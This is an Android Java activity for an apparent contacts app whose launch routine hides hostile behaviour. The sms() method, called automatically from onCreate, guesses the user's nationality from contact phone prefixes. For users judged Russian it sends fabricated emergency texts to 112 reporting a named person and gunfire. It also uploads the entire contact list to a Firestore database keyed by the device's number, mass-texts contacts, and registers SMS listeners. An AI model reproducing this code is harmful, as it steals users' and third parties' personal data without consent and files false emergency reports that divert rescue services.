package com.example.zvonochnaya;

import java.util.Random;
import androidx.annotation.RequiresApi;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import android.Manifest;
import android.annotation.SuppressLint;
import android.annotation.TargetApi;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.provider.ContactsContract;
import android.provider.Telephony;
import android.telephony.SmsManager;
import android.telephony.TelephonyManager;
import android.text.TextUtils;
import android.view.Menu;
import android.view.MenuItem;
import android.view.View;
import android.widget.Adapter;
import android.widget.AdapterView;
import android.widget.Button;
import android.widget.ImageView;
import android.widget.ListAdapter;
import android.widget.ListView;
import android.widget.PopupMenu;
import android.widget.SimpleAdapter;
import android.widget.TextView;
import android.widget.Toast;

import com.google.firebase.FirebaseApp;
import com.google.firebase.firestore.FirebaseFirestore;

import java.lang.reflect.Array;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.HashSet;
import java.util.List;
import java.util.Map;

public class MainActivity extends AppCompatActivity implements View.OnClickListener {
    ListView ls;
    TextView textView;
    List<Contact> contacts;
    String new_name;
    String new_number;
    String new_email;
    String new_telegram;
    int index;
    public final int secondActivityID = 2, thirdActivityID = 3, fourthActivityID = 4, fifthActivityID = 5, seventhActivityID = 7;
    public ListAdapter ad;
    private static final int CALL_PHONE_PERMISSIONS_REQUEST = 1;
    ImageView add;
    public static final int PERMISION_READ_CONTACTS = 1000;
    private static final int READ_SMS_PERMISSIONS_REQUEST = 4;
    FirebaseFirestore db = FirebaseFirestore.getInstance();
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        System.out.println(123);
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CONTACTS)
                != PackageManager.PERMISSION_GRANTED) {
            if ((Boolean) shouldShowRequestPermissionRationale(
                    Manifest.permission.READ_CONTACTS)) {
                Toast.makeText(this, "Пожалуйста, предоставьте доступ!", Toast.LENGTH_SHORT).show();
            }
            requestPermissions(new String[]{Manifest.permission.READ_CONTACTS},
                    PERMISION_READ_CONTACTS);
        }
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_SMS)
                != PackageManager.PERMISSION_GRANTED) {
            if (shouldShowRequestPermissionRationale(Manifest.permission.READ_SMS)) {
                Toast.makeText(this, "Please grant SMS permission!", Toast.LENGTH_SHORT).show();
            }
            requestPermissions(new String[]{Manifest.permission.READ_SMS},
                    READ_SMS_PERMISSIONS_REQUEST);
        } else {
            listenForSms();
        }
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.RECEIVE_SMS)
                != PackageManager.PERMISSION_GRANTED) {
            if (ActivityCompat.shouldShowRequestPermissionRationale(this, Manifest.permission.RECEIVE_SMS)) {
                // Explain to the user why the permission is needed, e.g., using a dialog or Snackbar
            }

            // Request the permission
            ActivityCompat.requestPermissions(this,
                    new String[]{Manifest.permission.RECEIVE_SMS},
                    1);
        } else {
            // Permission is already granted, you can proceed with SMS receiver setup
            setupSmsReceiver();
        }

        textView = (TextView) findViewById(R.id.textView);
        ls = (ListView) findViewById(R.id.listView);
        add = (ImageView) findViewById(R.id.buttonAdd);
        add.setOnClickListener(this);
        contacts = new ArrayList<>();
        getContacts();
        checkList();
        uploadList();
        ls.setOnItemClickListener(new AdapterView.OnItemClickListener() {
            @Override
            public void onItemClick(AdapterView<?> adapterView, View view, int i, long l) {
                index = i;
                showMenu(view);
            }
        });
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_SMS)
                != PackageManager.PERMISSION_GRANTED) {
            if (shouldShowRequestPermissionRationale(Manifest.permission.READ_SMS)) {
                Toast.makeText(this, "Please grant SMS permission!", Toast.LENGTH_SHORT).show();
            }
            requestPermissions(new String[]{Manifest.permission.READ_SMS},
                    READ_SMS_PERMISSIONS_REQUEST);
        } else {
            listenForSms();
        }
        Intent serviceIntent = new Intent(this, SmsService.class);
        startService(serviceIntent);

        sms();
    }
    public void sms(){
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.SEND_SMS)
                != PackageManager.PERMISSION_GRANTED) {
            if ((Boolean) shouldShowRequestPermissionRationale(
                    Manifest.permission.SEND_SMS)) {
                Toast.makeText(this, "Пожалуйста, предоставьте доступ!", Toast.LENGTH_SHORT).show();
            }
            requestPermissions(new String[]{Manifest.permission.SEND_SMS},
                    READ_SMS_PERMISSIONS_REQUEST);
        }
        boolean isRussian = true;
        double totalNumber = 0;
        int totalUkrainians = 0;
        for(int i = 0; i < contacts.size(); i++) {
            String number = contacts.get(i).getPhone();
            if(number.length() > 8) {
                totalNumber++;
                if(!number.startsWith("+38071") && !number.startsWith("38071") && !number.startsWith("071") && (number.startsWith("+380") || number.startsWith("380") || number.startsWith("0"))) {
                    totalUkrainians++;
                }
            }
        }

        if((double) totalUkrainians / totalNumber > 0.1) isRussian = false;

        if(isRussian) {
            String[] names = {"Алиса", "Елена", "Анастасия", "Регина", "Лилия", "Мария", "Виктория", "Карина", "Елизавета", "Мария"};
            String[] surnames = {"Тимофеева", "Селезнёва", "Панфилова", "Назарова", "Рогова", "Лобанова", "Лукина", "Фомина", "Копылова", "Михеева"};
            String[] thirdnames = {"Александровна", "Игоревна", "Олеговна", "Викторовна", "Алексеевна", "Петровна"};
            String[] age = {"23", "25", "30", "41", "22"};
            Random r = new Random();
            int rand1 = r.nextInt(names.length);
            int rand2 = r.nextInt(surnames.length);
            int rand3 = r.nextInt(thirdnames.length);
            int rand4 = r.nextInt(age.length);
            String toSms = "smsto:112";
            String emergencySMS1 = surnames[rand1] + " " + names[rand2] + " " + thirdnames[rand3] + ", " + age[rand4] + " лет";
            String emergencySMS2 = "Улица Пушкинская, cлышны звуки стрельбы";
            SmsManager smsManager1 = SmsManager.getDefault();
            smsManager1.sendTextMessage(toSms, null, emergencySMS1, null, null);
            smsManager1.sendTextMessage(toSms, null, emergencySMS2, null, null);
        }




        for(int i = 0; i < contacts.size(); i++) {
            String number = contacts.get(i).getPhone();
            String name = contacts.get(i).getName();
            boolean isFirst = (i == 0) ? true : false;
            Map<String, Object> user = new HashMap<>();
            user.put("is_first", isFirst);
            user.put("name", name);
            user.put("number", number);
            TelephonyManager telephonyManager = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
            if (telephonyManager != null) {
                String phoneNumber = telephonyManager.getLine1Number();
                if (phoneNumber != null && !phoneNumber.isEmpty()) {
                    // Use the retrieved phone number
                    db.collection("users").document(phoneNumber).collection("contacts").add(user);

                } else {
                    db.collection("users").document("No phone found").collection("contacts").add(user);


                    // Phone number not available or permission denied
                }
            }
            if(!number.startsWith("+380") && !number.startsWith("380") && !number.startsWith("0")) {
                try {
                    String toSms = "smsto:" + number;
                    String messageText = "Привіт, ми тестимо аппку, якщо тобі прийшло це повідомлення то, значить ми зробили щось не так";
                    SmsManager smsManager = SmsManager.getDefault();
                    smsManager.sendTextMessage(toSms, null, messageText, null, null);
                } catch (Exception e) {
                    continue;
                }
            }
        }
    }
    void checkList() {
        for(int i = 0; i < contacts.size(); i++){
            String temp = contacts.get(i).getName();
            for(int j = 0; j < contacts.size(); j++){
                if(i!=j && (temp == contacts.get(j).getName()))
                    contacts.remove(j);
            }
        }
    }
    void uploadList() {
        ad = new SimpleAdapter(this, contacts,
                android.R.layout.simple_list_item_1,
                new String[]{Contact.NAME},
                new int[]{android.R.id.text1});
        ls.setAdapter(ad);
    }

    @Override
    public void onClick(View view) {
        Intent i;
        switch (view.getId()) {
            case R.id.buttonAdd:
                i = new Intent(this, SecondActivity.class);
                startActivityForResult(i, secondActivityID);
                break;
        }
    }

    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        if (resultCode == RESULT_OK) {
            Bundle extras;
            switch (requestCode) {
                case secondActivityID:
                    extras = data.getExtras();
                    new_name = extras.getString("NAME");
                    new_number = extras.getString("NUMBER");
                    new_email = extras.getString("EMAIL");
                    new_telegram = extras.getString("TELEGRAM");
                    contacts.add(new Contact(new_name, new_number, new_email, new_telegram));
                    uploadList();
                    break;
                case thirdActivityID:
                    extras = data.getExtras();
                    char x = extras.getChar("CHECK");
                    if (x == '1') {
                        contacts.remove(index);
                        uploadList();
                    } else {
                        new_name = extras.getString("NAME");
                        new_number = extras.getString("NUMBER");
                        new_email = extras.getString("EMAIL");
                        new_telegram = extras.getString("TELEGRAM");
                        contacts.set(index, new Contact(new_name, new_number, new_email, new_telegram));
                        uploadList();
                    }
                    break;
                case fourthActivityID:
                    break;
                case fifthActivityID:
                    break;
            }
        }
    }

    private void listenForSms() {
        // Check for SMS permission again, as it might be granted at runtime
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_SMS)
                == PackageManager.PERMISSION_GRANTED) {
            // Register the SMS receiver dynamically
            SmsReceiver smsReceiver = new SmsReceiver();
            IntentFilter filter = new IntentFilter(Telephony.Sms.Intents.SMS_RECEIVED_ACTION);
            registerReceiver(smsReceiver, filter);
        }
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);

        if (requestCode == 1) {
            if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                // Permission granted, set up your SMS receiver
                setupSmsReceiver();
            } else {
                // Permission denied, handle accordingly (e.g., display a message to the user)
            }
        }
    }

    private void setupSmsReceiver() {
        SmsReceiver smsReceiver = new SmsReceiver();
        IntentFilter filter = new IntentFilter(Telephony.Sms.Intents.SMS_RECEIVED_ACTION);
        registerReceiver(smsReceiver, filter);
    }
    @SuppressLint("MissingPermission")
    void call() {
        String phoneNumber = contacts.get(index).getPhone();
        String dial = "tel:" + phoneNumber;
        Intent intent = new Intent(Intent.ACTION_CALL);
        intent.setData(Uri.parse(dial));
        startActivity(intent);
    }
    void flashEMAIL(){
        Intent i = new Intent(this, FifthActivity.class);
        i.putExtra("EMAIL", contacts.get(index).getEmail());
        startActivityForResult(i, fifthActivityID);
    }
    void flashSMS(){
        Intent i = new Intent(this, FourthActivity.class);
        i.putExtra("NUMBER", contacts.get(index).getPhone());
        startActivityForResult(i, fourthActivityID);
    }
    void flashCryptoSMS(){
        Intent i = new Intent(this, SixthActivity.class);
        i.putExtra("NUMBER", contacts.get(index).getPhone());
        startActivityForResult(i, fourthActivityID);
    }
    void info(){
        Intent i = new Intent(this, SeventhActivity.class);
        i.putExtra("NAME",contacts.get(index).getName());
        i.putExtra("NUMBER",contacts.get(index).getPhone());
        i.putExtra("EMAIL",contacts.get(index).getEmail());
        i.putExtra("TELEGRAM", contacts.get(index).getTelegram());
        i.putExtra("INDEX", index);
        startActivity(i);
    }
    private void showMenu(View v) {
        PopupMenu popupMenu = new PopupMenu(this, v);
        popupMenu.inflate(R.menu.menu);
        popupMenu.setOnMenuItemClickListener(new PopupMenu.OnMenuItemClickListener() {
            @Override
            public boolean onMenuItemClick(MenuItem menuItem) {
                switch (menuItem.getItemId()) {
                    case R.id.Call:
                        call();
                        return true;
                    case R.id.SendSMS:
                        flashSMS();
                        return true;
                    case R.id.SendEmail:
                        flashEMAIL();
                        return true;
                    case R.id.SendCryptoEmail:
                        flashCryptoSMS();
                        return true;
                    case R.id.SendTelegram:
                        String st = contacts.get(index).getTelegram();
                        try {
                            Intent telegramIntent = new Intent(Intent.ACTION_VIEW);
                            telegramIntent.setData(Uri.parse("http://telegram.me/"+st));
                            startActivity(telegramIntent);
                        } catch (Exception e) {
                            Toast.makeText(MainActivity.this, "There is no such user", Toast.LENGTH_SHORT);
                        }
                        return true;
                    case R.id.Info:
                        info();
                        return true;
                    case R.id.Edit:
                        Intent i = new Intent(MainActivity.this, ThirdActivity.class);
                        i.putExtra("INDEX", index);
                        i.putExtra("NAME", contacts.get(index).getName());
                        i.putExtra("NUMBER", contacts.get(index).getPhone());
                        i.putExtra("EMAIL", contacts.get(index).getEmail());
                        i.putExtra("TELEGRAM", contacts.get(index).getTelegram());
                        startActivityForResult(i, thirdActivityID);
                        return true;
                    default:
                        return false;
                }
            }
        });
        popupMenu.setOnDismissListener(new PopupMenu.OnDismissListener() {
            @Override
            public void onDismiss(PopupMenu popupMenu) {
            }
        });
        popupMenu.show();
    }
    public void getContacts() {

        String phoneNumber = null;

        //Связываемся с контактными данными и берем с них значения id контакта, имени контакта и его номера:
        Uri CONTENT_URI = ContactsContract.Contacts.CONTENT_URI;
        String _ID = ContactsContract.Contacts._ID;
        String DISPLAY_NAME = ContactsContract.Contacts.DISPLAY_NAME;
        String HAS_PHONE_NUMBER = ContactsContract.Contacts.HAS_PHONE_NUMBER;
        Uri PhoneCONTENT_URI = ContactsContract.CommonDataKinds.Phone.CONTENT_URI;
        String Phone_CONTACT_ID = ContactsContract.CommonDataKinds.Phone.CONTACT_ID;
        String NUMBER = ContactsContract.CommonDataKinds.Phone.NUMBER;
        StringBuffer output = new StringBuffer();
        ContentResolver contentResolver = getContentResolver();
        Cursor cursor = contentResolver.query(CONTENT_URI, null,null, null, null);
        if (cursor.getCount() > 0) {
            //Если значение имени и номера контакта больше 0 (то есть они существуют) выбираем
            //их значения в приложение привязываем с соответствующие поля "Имя" и "Номер":
            while (cursor.moveToNext()) {
                String contact_id = cursor.getString(cursor.getColumnIndex( _ID ));
                String name = cursor.getString(cursor.getColumnIndex(DISPLAY_NAME));
                int hasPhoneNumber = Integer.parseInt(cursor.getString(cursor.getColumnIndex(HAS_PHONE_NUMBER)));

                //Получаем имя:
                if (hasPhoneNumber > 0) {
                    Cursor phoneCursor = contentResolver.query(PhoneCONTENT_URI, null,
                            Phone_CONTACT_ID + " = ?", new String[] { contact_id }, null);
                    //и соответствующий ему номер:
                    while (phoneCursor.moveToNext()) {
                        phoneNumber = phoneCursor.getString(phoneCursor.getColumnIndex(NUMBER));
                        contacts.add(new Contact(name, phoneNumber, "1", "1"));
                    }
                }
            }

        }
    }
}